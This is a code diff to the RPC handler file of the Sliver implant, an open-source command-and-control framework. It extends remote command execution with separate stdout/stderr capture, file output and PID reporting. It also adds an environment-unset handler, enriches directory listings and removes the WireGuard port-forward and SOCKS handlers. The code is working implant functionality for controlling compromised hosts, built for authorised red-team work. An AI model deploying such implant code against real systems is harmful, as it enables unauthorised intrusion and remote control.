@@ -20,6 +20,7 @@ package handlers
 
 import (
 	"archive/tar"
+	"bufio"
 	"bytes"
 	"compress/gzip"
 	"errors"
@@ -38,12 +39,13 @@ import (
 	"path/filepath"
 
 	// {{if .Config.WGc2Enabled}}
-	"github.com/bishopfox/sliver/implant/sliver/forwarder"
+
 	// {{end}}
+
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/golang/protobuf/proto"
+	"google.golang.org/protobuf/proto"
 )
 
 // RPCResponse - Request/response callback
@@ -97,7 +99,8 @@ func dirListHandler(data []byte, resp RPCResponse) {
 	dir, files, err := getDirList(dirListReq.Path)
 
 	// Convert directory listing to protobuf
-	dirList := &sliverpb.Ls{Path: dir}
+	timezone, offset := time.Now().Zone()
+	dirList := &sliverpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
 	if err == nil {
 		dirList.Exists = true
 	} else {
@@ -109,6 +112,13 @@ func dirListHandler(data []byte, resp RPCResponse) {
 			Name:  fileInfo.Name(),
 			IsDir: fileInfo.IsDir(),
 			Size:  fileInfo.Size(),
+			/* Send the time back to the client / server as the number of seconds
+			since epoch.  This will decouple formatting the time to display from the
+			time itself.  We can change the format of the time displayed in the client
+			and not have to worry about having to update implants.
+			*/
+			ModTime: fileInfo.ModTime().Unix(),
+			Mode:    fileInfo.Mode().String(),
 		})
 	}
 
@@ -118,7 +128,13 @@ func dirListHandler(data []byte, resp RPCResponse) {
 }
 
 func getDirList(target string) (string, []os.FileInfo, error) {
-	dir, _ := filepath.Abs(target)
+	dir, err := filepath.Abs(target)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("dir list failed to construct path %s", err)
+		// {{end}}
+		return "", nil, err
+	}
 	if _, err := os.Stat(dir); !os.IsNotExist(err) {
 		files, err := ioutil.ReadDir(dir)
 		return dir, files, err
@@ -131,7 +147,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
+		log.Printf("error decoding message: %s", err)
 		// {{end}}
 		return
 	}
@@ -353,7 +369,11 @@ func uploadHandler(data []byte, resp RPCResponse) {
 
 func executeHandler(data []byte, resp RPCResponse) {
 	var (
-		err error
+		err       error
+		stdErr    io.Writer
+		stdOut    io.Writer
+		errWriter *bufio.Writer
+		outWriter *bufio.Writer
 	)
 	execReq := &sliverpb.ExecuteReq{}
 	err = proto.Unmarshal(data, execReq)
@@ -368,9 +388,43 @@ func executeHandler(data []byte, resp RPCResponse) {
 	cmd := exec.Command(execReq.Path, execReq.Args...)
 
 	if execReq.Output {
-		res, err := cmd.CombinedOutput()
+		stdOutBuff := new(bytes.Buffer)
+		stdErrBuff := new(bytes.Buffer)
+		stdErr = stdErrBuff
+		stdOut = stdOutBuff
+		if execReq.Stderr != "" {
+			stdErrFile, err := os.Create(execReq.Stderr)
+			if err != nil {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
+				proto.Marshal(execResp)
+				resp(data, err)
+				return
+			}
+			defer stdErrFile.Close()
+			errWriter = bufio.NewWriter(stdErrFile)
+			stdErr = io.MultiWriter(errWriter, stdErrBuff)
+		}
+		if execReq.Stdout != "" {
+			stdOutFile, err := os.Create(execReq.Stdout)
+			if err != nil {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
+				proto.Marshal(execResp)
+				resp(data, err)
+				return
+			}
+			defer stdOutFile.Close()
+			outWriter = bufio.NewWriter(stdOutFile)
+			stdOut = io.MultiWriter(outWriter, stdOutBuff)
+		}
+		cmd.Stdout = stdOut
+		cmd.Stderr = stdErr
+		err := cmd.Run()
 		//{{if .Config.Debug}}
-		log.Println(string(res))
+		log.Println(string(stdOutBuff.String()))
 		//{{end}}
 		if err != nil {
 			// Exit errors are not a failure of the RPC, but of the command.
@@ -382,7 +436,17 @@ func executeHandler(data []byte, resp RPCResponse) {
 				}
 			}
 		}
-		execResp.Result = string(res)
+		if errWriter != nil {
+			errWriter.Flush()
+		}
+		if outWriter != nil {
+			outWriter.Flush()
+		}
+		execResp.Stderr = stdErrBuff.String()
+		execResp.Stdout = stdOutBuff.String()
+		if cmd.Process != nil {
+			execResp.Pid = uint32(cmd.Process.Pid)
+		}
 	} else {
 		err = cmd.Start()
 		if err != nil {
@@ -449,6 +513,27 @@ func setEnvHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func unsetEnvHandler(data []byte, resp RPCResponse) {
+	unsetEnvReq := &sliverpb.UnsetEnvReq{}
+	err := proto.Unmarshal(data, unsetEnvReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+
+	err = os.Unsetenv(unsetEnvReq.Name)
+	unsetEnvResp := &sliverpb.UnsetEnv{
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		unsetEnvResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(unsetEnvResp)
+	resp(data, err)
+}
+
 func reconnectIntervalHandler(data []byte, resp RPCResponse) {
 	reconnectIntervalReq := &sliverpb.ReconnectIntervalReq{}
 	err := proto.Unmarshal(data, reconnectIntervalReq)
@@ -459,13 +544,13 @@ func reconnectIntervalHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	reconnectInterval := reconnectIntervalReq.GetReconnectIntervalSeconds()
+	reconnectInterval := reconnectIntervalReq.GetReconnectInterval()
 	// {{if .Config.Debug}}
 	log.Printf("Update reconnect interval called: %d\n", reconnectInterval)
 	// {{end}}
 
 	// Set the reconnect interval value
-	transports.SetReconnectInterval(time.Duration(reconnectInterval) * time.Second)
+	transports.SetReconnectInterval(reconnectInterval)
 
 	recIntervalResp := &sliverpb.ReconnectInterval{}
 	recIntervalResp.Response = &commonpb.Response{}
@@ -487,13 +572,13 @@ func pollIntervalHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	pollInterval := pollIntervalReq.GetPollIntervalSeconds()
+	pollInterval := pollIntervalReq.GetPollInterval()
 	// {{if .Config.Debug}}
 	log.Printf("Update poll interval called: %d\n", pollInterval)
 	// {{end}}
 
 	// Set the reconnect interval value
-	transports.SetPollInterval(time.Duration(pollInterval) * time.Second)
+	transports.SetPollTimeout(pollInterval)
 
 	pollIntervalResp := &sliverpb.PollInterval{}
 	pollIntervalResp.Response = &commonpb.Response{}
@@ -504,144 +589,6 @@ func pollIntervalHandler(data []byte, resp RPCResponse) {
 	data, err = proto.Marshal(pollIntervalResp)
 	resp(data, err)
 }
-
-// {{if .Config.WGc2Enabled}}
-
-func wgListTCPForwardersHandler(_ []byte, resp RPCResponse) {
-	fwders := forwarder.GetTCPForwarders()
-	listResp := &sliverpb.WGTCPForwarders{}
-	fwdList := make([]*sliverpb.WGTCPForwarder, 0)
-	for _, f := range fwders {
-		fwdList = append(fwdList, &sliverpb.WGTCPForwarder{
-			ID:         int32(f.ID),
-			LocalAddr:  f.LocalAddr(),
-			RemoteAddr: f.RemoteAddr(),
-		})
-	}
-	listResp.Forwarders = fwdList
-	data, err := proto.Marshal(listResp)
-	resp(data, err)
-}
-
-func wgStartPortfwdHandler(data []byte, resp RPCResponse) {
-	fwdReq := &sliverpb.WGPortForwardStartReq{}
-	err := proto.Unmarshal(data, fwdReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-
-	fwder := forwarder.NewWGTCPForwarder(fwdReq.RemoteAddress, transports.GetTUNAddress(), int(fwdReq.LocalPort), transports.GetTNet())
-	go fwder.Start()
-	fwdResp := &sliverpb.WGPortForward{
-		Response: &commonpb.Response{},
-		Forwarder: &sliverpb.WGTCPForwarder{
-			ID:         int32(fwder.ID),
-			LocalAddr:  fwder.LocalAddr(),
-			RemoteAddr: fwder.RemoteAddr(),
-		},
-	}
-	if err != nil {
-		fwdResp.Response.Err = err.Error()
-	}
-	data, err = proto.Marshal(fwdResp)
-	resp(data, err)
-}
-
-func wgStopPortfwdHandler(data []byte, resp RPCResponse) {
-	stopReq := &sliverpb.WGPortForwardStopReq{}
-	err := proto.Unmarshal(data, stopReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-	stopResp := &sliverpb.WGPortForward{
-		Response: &commonpb.Response{},
-	}
-	fwd := forwarder.GetTCPForwarder(int(stopReq.ID))
-	if fwd == nil {
-		stopResp.Response.Err = fmt.Sprintf("no forwarder found for id %d", stopReq.ID)
-	} else {
-		stopResp.Forwarder = &sliverpb.WGTCPForwarder{
-			ID:         int32(fwd.ID),
-			LocalAddr:  fwd.LocalAddr(),
-			RemoteAddr: fwd.RemoteAddr(),
-		}
-		fwd.Stop()
-		forwarder.RemoveTCPForwarder(fwd.ID)
-	}
-	data, err = proto.Marshal(stopResp)
-	resp(data, err)
-}
-
-func wgListSocksServersHandler(data []byte, resp RPCResponse) {
-	socksServers := forwarder.GetSocksServers()
-	listResp := &sliverpb.WGSocksServers{}
-	serverList := make([]*sliverpb.WGSocksServer, 0)
-	for _, s := range socksServers {
-		serverList = append(serverList, &sliverpb.WGSocksServer{
-			ID:        int32(s.ID),
-			LocalAddr: s.LocalAddr(),
-		})
-	}
-	listResp.Servers = serverList
-	data, err := proto.Marshal(listResp)
-	resp(data, err)
-}
-
-func wgStartSocksHandler(data []byte, resp RPCResponse) {
-	startReq := &sliverpb.WGSocksStartReq{}
-	err := proto.Unmarshal(data, startReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-	server := forwarder.NewWGSocksServer(int(startReq.Port), transports.GetTUNAddress(), transports.GetTNet())
-	go server.Start()
-	startResp := &sliverpb.WGSocks{
-		Response: &commonpb.Response{},
-		Server: &sliverpb.WGSocksServer{
-			ID:        int32(server.ID),
-			LocalAddr: server.LocalAddr(),
-		},
-	}
-	data, err = proto.Marshal(startResp)
-	resp(data, err)
-}
-func wgStopSocksHandler(data []byte, resp RPCResponse) {
-	stopReq := &sliverpb.WGSocksStopReq{}
-	err := proto.Unmarshal(data, stopReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-	server := forwarder.GetSocksServer(int(stopReq.ID))
-	stopResp := &sliverpb.WGSocks{
-		Response: &commonpb.Response{},
-	}
-	if server == nil {
-		stopResp.Response.Err = fmt.Sprintf("no server found for id %d", stopReq.ID)
-	} else {
-		stopResp.Server = &sliverpb.WGSocksServer{
-			ID:        int32(server.ID),
-			LocalAddr: server.LocalAddr(),
-		}
-		server.Stop()
-		forwarder.RemoveSocksServer(server.ID)
-	}
-	data, err = proto.Marshal(stopResp)
-	resp(data, err)
-}
-
-// {{end}}
 
 // ---------------- Data Encoders ----------------
 
